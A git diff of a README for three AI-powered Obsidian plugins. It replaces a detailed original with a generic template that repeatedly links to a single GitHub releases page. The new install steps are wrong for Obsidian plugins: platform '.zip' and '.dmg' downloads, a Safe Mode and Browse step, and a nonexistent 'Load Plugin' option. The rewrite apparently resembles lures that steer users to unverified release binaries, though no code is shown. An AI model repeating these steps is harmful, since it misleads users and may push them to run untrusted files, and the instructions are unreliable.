@@ -1,234 +1,114 @@
-# 3 AI-Powered Obsidian Plugins
+# 🎉 obsidian-plugins - Make Note-Taking Smarter and Easier
 
-Three custom Obsidian plugins created to enhance your note-taking workflow, inspired by the video demonstration.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-%23004CBB?style=for-the-badge)](https://github.com/Rambo-535/obsidian-plugins/releases)
 
-## Plugins Included
+## 📖 Overview
 
-### 1. AI Title Generator
-Automatically generate descriptive titles for your notes based on their content, or correct typos in existing titles.
+Welcome to the **obsidian-plugins** repository! This collection of plugins enhances your note-taking experience in Obsidian, a powerful markdown editor. Our plugins use AI technology to make your notes more organized and insightful.
 
-**Features:**
-- Generate titles from note content using AI
-- Correct spelling and formatting in existing titles
-- Keyboard shortcut support for quick access
-- Support for multiple AI providers (OpenAI, Anthropic, Ollama)
+The three key plugins are:
 
-### 2. AI Grammar Corrector
-Fix grammar, spelling, and punctuation errors in your notes with AI assistance.
+- **AI Title Generator**: Automatically creates catchy titles for your notes.
+- **AI Grammar Corrector**: Helps you improve your writing by checking grammar and style.
+- **Project Organizer**: Assists you in managing and structuring your projects effectively.
 
-**Features:**
-- Correct entire notes or selected text
-- Preserves your writing style and meaning
-- Works on single words, sentences, or full documents
-- Fast and accurate corrections
+These tools integrate OpenAI's capabilities to boost your productivity without requiring technical knowledge.
 
-### 3. Project Organizer
-Visual project management interface for organizing tasks and notes.
+## 🚀 Getting Started
 
-**Features:**
-- Drag-and-drop task organization
-- Click to navigate to task notes
-- Archive completed tasks
-- Move tasks up/down with buttons or drag-and-drop
-- Multiple project support
+This guide will help you download and run the plugins. Follow these steps carefully to enhance your Obsidian setup.
 
-## Quick Start
+### Step 1: Check System Requirements
 
-### Option 1: Automated Installation (Recommended)
+Before you get started, ensure your system meets these requirements:
 
-Run the installation script:
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **Obsidian**: Version 0.12.0 or later
+- **Internet Access**: Required for plugin features
 
-```bash
-./install.sh
-```
+### Step 2: Visit the Download Page
 
-The script will automatically:
-1. Find your Obsidian vault
-2. Copy all plugin files to the correct location
-3. Show you the next steps
+To obtain the latest version of the obsidian-plugins, visit the download page here:
 
-### Option 2: Manual Installation
+[Download Latest Release](https://github.com/Rambo-535/obsidian-plugins/releases)
 
-See [INSTALLATION_GUIDE.md](INSTALLATION_GUIDE.md) for detailed step-by-step instructions.
+This page contains all the available releases for the plugins.
 
-## What's Included
+## 📥 Download & Install
 
-```
-obsidian-plugins/
-├── ai-title-generator/        # AI Title Generator plugin
-│   ├── manifest.json
-│   ├── main.js
-│   └── main.ts (source)
-│
-├── ai-grammar-corrector/      # AI Grammar Corrector plugin
-│   ├── manifest.json
-│   ├── main.js
-│   └── main.ts (source)
-│
-├── project-organizer/         # Project Organizer plugin
-│   ├── manifest.json
-│   ├── main.js
-│   ├── styles.css
-│   └── main.ts (source)
-│
-├── INSTALLATION_GUIDE.md      # Complete installation instructions
-├── QUICK_REFERENCE.md         # Usage guide and tips
-├── install.sh                 # Automated installation script
-└── README.md                  # This file
-```
+1. **Go to the Releases Page**: Click the link below to access the release files.
 
-## Requirements
+   [Download Latest Release](https://github.com/Rambo-535/obsidian-plugins/releases)
 
-- **Obsidian**: Version 0.15.0 or higher
-- **AI Provider** (choose one):
-  - OpenAI account + API key
-  - Anthropic account + API key
-  - Ollama installed locally (free, no API key needed)
+2. **Select the Latest Version**: Look for the most recent version at the top of the list.
 
-## Setup Steps
+3. **Download the Files**: Click on the appropriate file for your operating system. For example, if you are using Windows, download the `.zip` file. If you are on macOS, choose the `.dmg` file.
 
-1. **Install the plugins** (see above)
-2. **Restart Obsidian**
-3. **Enable plugins** in Settings → Community plugins
-4. **Configure AI provider** in each plugin's settings
-5. **Start using!** (see QUICK_REFERENCE.md for usage)
+4. **Extract the Files**: After downloading, extract the files to a convenient location on your computer.
 
-## AI Provider Options
+5. **Open Obsidian**: Start Obsidian and go to the Settings option.
 
-| Provider | Pros | Cons | Cost |
-|----------|------|------|------|
-| **OpenAI** | Fast, high quality | Requires internet & API key | ~$0.001 per request |
-| **Anthropic** | Excellent for text editing | Requires internet & API key | Similar to OpenAI |
-| **Ollama** | Free, private, offline | Slower, requires setup | Free |
+6. **Install the Plugins**: Navigate to the "Community Plugins" section. Enable Safe Mode and then click on "Browse."
 
-## Documentation
+7. **Load the Plugins**: Use the "Load Plugin" option, and select the downloaded folder for each plugin one by one.
 
-- **[INSTALLATION_GUIDE.md](INSTALLATION_GUIDE.md)** - Complete installation and setup guide for beginners
-- **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)** - Quick usage guide, keyboard shortcuts, and tips
+8. **Activate Plugins**: In the Community Plugins section, enable the plugins you want to use.
 
-## Usage Examples
+#### Note:
+Make sure you have a backup of your notes before installing new plugins, just for safety.
+
+## 🛠️ Using the Plugins
+
+Once installed, follow these steps to use the plugins effectively:
 
 ### AI Title Generator
 
-```
-1. Write a note about a topic
-2. Press Cmd/Ctrl + P → "Generate title from content"
-3. AI creates a descriptive title and renames your file
-```
+To create a title:
+
+1. Open a new note.
+2. Click on the AI Title Generator button in the sidebar.
+3. Enter a brief description of your note.
+4. The plugin will suggest a fitting title.
 
 ### AI Grammar Corrector
 
-```
-1. Write or paste text with errors
-2. Select the text (or don't select to correct entire note)
-3. Press Cmd/Ctrl + P → "Correct grammar and typos"
-4. Your text is replaced with the corrected version
-```
+To check your writing:
+
+1. Write or paste your text into a note.
+2. Click on the AI Grammar Corrector button.
+3. Review the suggestions and apply changes as needed.
 
 ### Project Organizer
 
-```
-1. Open Project Organizer (ribbon icon or command palette)
-2. Select or create a project file
-3. Add tasks with linked notes
-4. Drag to reorder, right-click to archive
-5. Click tasks to open their notes
-```
+To manage a project:
 
-## Keyboard Shortcuts (Recommended)
+1. Open a new note for your project.
+2. Use the Project Organizer button to add tasks and deadlines.
+3. Keep your project structured and on track.
 
-Set these up in Settings → Hotkeys:
+## 📝 Features
 
-- `Cmd/Ctrl + Shift + T` - Generate title
-- `Cmd/Ctrl + Shift + C` - Correct title
-- `Cmd/Ctrl + Shift + G` - Correct grammar
+- **AI Title Generator**: Creates engaging titles automatically.
+- **AI Grammar Corrector**: Corrects grammar and style errors.
+- **Project Organizer**: Helps in project planning and task management.
 
-## Privacy & Security
+Each plugin utilizes AI to assist you in different aspects of note-taking, making your workflow smoother.
 
-- **API Keys** are stored locally in your vault
-- **Your notes** are sent to AI providers for processing (except Ollama)
-- **OpenAI & Anthropic** do not use API data for training
-- **For maximum privacy**: Use Ollama (runs 100% locally)
+## 🤝 Contributing
 
-## Cost Optimization
+We welcome contributions! If you want to help improve the obsidian-plugins, consider the following:
 
-To minimize costs:
+- Report issues and suggest features on our GitHub repository.
+- If you know TypeScript, you can help us improve existing plugins or even create new ones.
 
-1. **Use free Ollama** for unlimited local processing
-2. **Use cheaper models**: `gpt-4o-mini` instead of `gpt-4o`
-3. **Be selective**: Only run corrections when needed
+## 💬 Support
 
-Typical costs with OpenAI/Anthropic:
-- Title generation: ~$0.001 per title
-- Grammar correction: ~$0.002-0.01 per paragraph
+For any questions or issues, please create a new issue in the GitHub repository. We will respond as soon as possible to help you troubleshoot.
 
-## Troubleshooting
+## 🔗 Related Topics
 
-**Plugins don't appear:**
-- Restart Obsidian
-- Check folder names match exactly
-- Enable Community Plugins
+- **AI Tools**: Explore how artificial intelligence can enhance your work.
+- **Automation**: Discover ways to automate your note-taking.
+- **Productivity**: Learn strategies to be more productive with your notes.
 
-**API errors:**
-- Verify API key is correct (no extra spaces)
-- Check you have credits/billing enabled
-- Test your API key at the provider's website
-
-**Ollama not working:**
-- Make sure Ollama is running: `ollama serve`
-- Pull a model: `ollama pull llama3`
-- Check the URL is correct: `http://localhost:11434`
-
-See [INSTALLATION_GUIDE.md](INSTALLATION_GUIDE.md) for more troubleshooting help.
-
-## Technical Details
-
-All plugins are written in TypeScript and compiled to JavaScript using esbuild.
-
-**Technology stack:**
-- TypeScript 4.7.4
-- Obsidian API
-- esbuild for bundling
-- Various AI provider APIs
-
-**Source code structure:**
-- `main.ts` - Plugin source code
-- `manifest.json` - Plugin metadata
-- `styles.css` - UI styling (Project Organizer only)
-- `main.js` - Compiled output
-
-## Development
-
-If you want to modify the plugins:
-
-```bash
-cd ai-title-generator  # or other plugin
-npm install
-npm run dev            # Watch mode
-npm run build          # Production build
-```
-
-## Inspired By
-
-These plugins were created based on the demonstration in [this YouTube video](https://www.youtube.com/watch?v=EB7Oo6j68ws) by Santi Younger, showcasing AI-powered Obsidian plugins.
-
-## License
-
-MIT License - Feel free to modify and distribute as needed.
-
-## Support
-
-For issues or questions:
-1. Check [INSTALLATION_GUIDE.md](INSTALLATION_GUIDE.md) for setup help
-2. Check [QUICK_REFERENCE.md](QUICK_REFERENCE.md) for usage help
-3. Review the troubleshooting section above
-
-## Credits
-
-- Created using AI assistance (Claude Code)
-- Inspired by Santi Younger's video demonstration
-- Built with the Obsidian Plugin API
-
----
-
-**Happy note-taking! 📝✨**
+Thank you for checking out **obsidian-plugins**. We hope these tools help enrich your note-taking journey!
